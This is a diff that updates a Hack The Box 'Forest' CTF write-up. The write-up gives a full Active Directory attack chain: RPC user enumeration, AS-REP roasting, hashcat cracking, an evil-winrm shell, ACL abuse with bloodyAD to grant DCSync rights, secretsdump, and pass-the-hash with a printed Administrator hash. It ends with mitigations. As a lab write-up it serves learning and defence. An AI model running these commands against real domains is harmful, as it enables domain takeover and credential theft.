@@ -1,10 +1,10 @@
 ---
 title: "Hack The Box - Forest - Writeup"
-description: "Active Directory enumeration, AS-REP Roasting, BloodHound analysis, and DCSync exploitation on HackTheBox Forest."
+description: "Anonymous RPC enumeration, AS-REP Roasting, BloodHound privilege analysis, ACL abuse, and DCSync exploitation on HackTheBox Forest."
 
-platform: Hack The Box
+platform: "Hack The Box"
 image: "/images/forest.png"
-difficulty: Easy
+difficulty: "Easy"
 draft: false
 
 tags:
@@ -14,6 +14,8 @@ tags:
   - AS-REP Roasting
   - BloodHound
   - DCSync
+  - ACL Abuse
+  - WinRM
 
 categories:
   - HTB
@@ -26,33 +28,36 @@ ShowBreadCrumbs: false
 
 # Overview
 
-Forest is a beginner-friendly Active Directory machine focused on LDAP enumeration, AS-REP Roasting, BloodHound privilege analysis, and DCSync abuse.
+Forest is a beginner-friendly Active Directory machine that focuses on domain enumeration, Kerberos abuse, BloodHound privilege analysis, and ACL exploitation.
 
-The machine demonstrates how weak Kerberos configurations and delegated Active Directory permissions can eventually lead to full domain compromise.
+The machine demonstrates how a low-privileged domain account can eventually lead to full Domain Administrator compromise through delegated Active Directory permissions.
 
 ---
 
 # Skills & Concepts
 
-- LDAP Enumeration
-- Kerberos Abuse
-- AS-REP Roasting
-- BloodHound Analysis
-- ACL Abuse
-- DCSync
-- Pass-the-Hash
-- Active Directory Privilege Escalation
+* Active Directory Enumeration
+* RPC Enumeration
+* Kerberos Abuse
+* AS-REP Roasting
+* BloodHound Analysis
+* ACL Abuse
+* DCSync
+* Pass-the-Hash
+* Active Directory Privilege Escalation
 
 ---
 
 # Tools Used
 
-- Nmap
-- ldapsearch
-- Impacket
-- Hashcat
-- Evil-WinRM
-- BloodHound
+* Nmap
+* rpcclient
+* Impacket
+* Hashcat
+* Evil-WinRM
+* BloodHound
+* SharpHound
+* BloodyAD
 
 ---
 
@@ -60,57 +65,77 @@ The machine demonstrates how weak Kerberos configurations and delegated Active D
 
 ## Nmap Scan
 
-Initial scan:
+Initial service enumeration:
 
 ```bash
-nmap -sC -sV -oA nmap/initial 10.10.10.161
+nmap -sVC -Pn 10.129.37.0
 ```
 
 Results:
 
 ```text
-53/tcp    open  domain
-88/tcp    open  kerberos-sec
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-389/tcp   open  ldap
-445/tcp   open  microsoft-ds
-5985/tcp  open  wsman
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+5985/tcp open  http
 ```
 
-The machine appeared to be a Domain Controller.
+The exposed services strongly suggested that the target was functioning as a Domain Controller.
 
 Important observations:
 
-- Kerberos exposed
-- LDAP available
-- WinRM enabled
-- SMB accessible
+* Kerberos exposed
+* LDAP available
+* SMB accessible
+* WinRM enabled
 
 ---
 
-# LDAP Enumeration
+# RPC Enumeration
 
-Enumerating domain users:
+Anonymous RPC enumeration was allowed on the target.
+
+Using `rpcclient`, domain users could be enumerated without authentication:
 
 ```bash
-ldapsearch -x -h 10.10.10.161 -b "DC=htb,DC=local"
+rpcclient -U "" -N 10.129.37.0
 ```
 
-Important account discovered:
+Enumerating users:
+
+```bash
+enumdomusers
+```
+
+Interesting accounts discovered:
 
 ```text
+sebastien
+lucinda
 svc-alfresco
+andy
+mark
+santi
 ```
+
+Among the enumerated users, `svc-alfresco` appeared to be a service account and became the primary target for further investigation.
 
 ---
 
 # AS-REP Roasting
 
-Checking for users without Kerberos pre-authentication:
+Enumerating Kerberos configuration revealed that the `svc-alfresco`
+account had Kerberos pre-authentication disabled.
+
+Accounts without Kerberos pre-authentication enabled are vulnerable to AS-REP Roasting, allowing attackers to request encrypted authentication material without valid credentials.
+
+Using Impacket:
 
 ```bash
-GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -no-pass
+impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.129.37.0
 ```
 
 Successful output:
@@ -119,7 +144,7 @@ Successful output:
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
 ```
 
-The account was vulnerable to AS-REP Roasting.
+The account was confirmed to be vulnerable to AS-REP Roasting.
 
 ---
 
@@ -128,7 +153,7 @@ The account was vulnerable to AS-REP Roasting.
 Using Hashcat:
 
 ```bash
-hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
 ```
 
 Recovered credentials:
@@ -141,11 +166,13 @@ svc-alfresco:s3rvice
 
 # WinRM Access
 
+Using the recovered credentials, remote shell access was obtained through WinRM:
+
 ```bash
-evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.37.0
 ```
 
-Successful authentication granted shell access.
+Successful authentication granted PowerShell access to the target system.
 
 ---
 
@@ -153,62 +180,115 @@ Successful authentication granted shell access.
 
 ## BloodHound Enumeration
 
-Collecting BloodHound data:
+![BloodHound Attack Path](/images/forest-bloodhound.png)
 
-```bash
-bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -c all -ns 10.10.10.161
+After obtaining an initial foothold, internal Active Directory enumeration was performed using SharpHound.
+
+BloodHound analysis revealed the following privilege chain:
+
+```text
+Account Operators
+        ↓ GenericAll
+Exchange Windows Permissions
+        ↓ WriteDacl
+HTB.LOCAL Domain Object
 ```
 
-BloodHound analysis revealed dangerous delegated permissions involving:
+The compromised `svc-alfresco` account was a member of `Account Operators`, which possessed `GenericAll` permissions over the `Exchange Windows Permissions` group.
 
-- Exchange Windows Permissions
-- Account Operators
+The `Exchange Windows Permissions` group had `WriteDacl` rights over the domain object, making it possible to grant DCSync privileges to `svc-alfresco`.
 
-These permissions eventually enabled DCSync abuse.
+---
+
+# ACL Abuse
+
+Adding `svc-alfresco` to the `Exchange Windows Permissions` group:
+
+```bash
+bloodyAD --host 10.129.37.0 \
+-d htb.local \
+-u svc-alfresco \
+-p 's3rvice' \
+add groupMember "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco"
+```
+
+Output:
+
+```text
+[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS
+```
+
+Granting DCSync privileges:
+
+```bash
+bloodyAD --host 10.129.37.0 \
+-d htb.local \
+-u svc-alfresco \
+-p 's3rvice' \
+add dcsync svc-alfresco
+```
+
+Output:
+
+```text
+[+] svc-alfresco is now able to DCSync
+```
 
 ---
 
 # DCSync Attack
 
+With DCSync privileges assigned, domain password hashes could be replicated directly from the Domain Controller.
+
 Using Impacket:
 
 ```bash
-secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
+impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.37.0
 ```
 
-Administrator hashes were successfully dumped.
+Administrator NTLM hash:
+
+```text
+Administrator:32693b11e6aa90eb43d32c72a07ceea6
+```
+
+At this stage, full domain compromise was achieved.
 
 ---
 
 # Administrator Access
 
-Using Pass-the-Hash:
+Using Pass-the-Hash authentication:
 
 ```bash
-evil-winrm -i 10.10.10.161 -u Administrator -H HASH
+evil-winrm -i 10.129.37.0 \
+-u Administrator \
+-H 32693b11e6aa90eb43d32c72a07ceea6
 ```
 
-This resulted in full Domain Administrator compromise.
+Successful authentication resulted in Domain Administrator access.
 
 ---
 
 # Attack Path Summary
 
 ```text
-LDAP Enumeration
-    ↓
+Anonymous RPC Enumeration
+            ↓
+User Discovery
+            ↓
 AS-REP Roasting
-    ↓
+            ↓
 Hash Cracking
-    ↓
+            ↓
 WinRM Access
-    ↓
+            ↓
 BloodHound Analysis
-    ↓
+            ↓
 ACL Abuse
-    ↓
+            ↓
 DCSync
-    ↓
+            ↓
 Domain Administrator
 ```
 
@@ -216,14 +296,28 @@ Domain Administrator
 
 # Lessons Learned
 
-Forest is an excellent beginner Active Directory machine because it introduces:
+Forest is an excellent introductory Active Directory machine because it demonstrates several core AD attack concepts in a realistic attack chain:
 
-- LDAP enumeration
-- Kerberos abuse
-- BloodHound analysis
-- ACL privilege escalation
-- DCSync attacks
+* Anonymous domain enumeration
+* Kerberos abuse through AS-REP Roasting
+* Internal privilege mapping with BloodHound
+* ACL-based privilege escalation
+* DCSync attacks
+* Pass-the-Hash authentication
 
-while remaining approachable for newcomers to Active Directory exploitation.
+The machine also highlights the dangers of excessive delegated permissions and insecure Active Directory configurations inside enterprise environments.
 
-It also reinforces the importance of delegated permissions and graph-based privilege escalation paths inside enterprise environments.
+---
+
+# Mitigations
+
+Several defensive measures could have prevented this compromise chain:
+
+* Disable anonymous RPC enumeration
+* Enforce Kerberos pre-authentication for all accounts
+* Regularly audit Active Directory ACLs
+* Restrict Exchange-related delegated permissions
+* Monitor DCSync-related replication requests
+* Limit WinRM access to administrative users only
+
+---
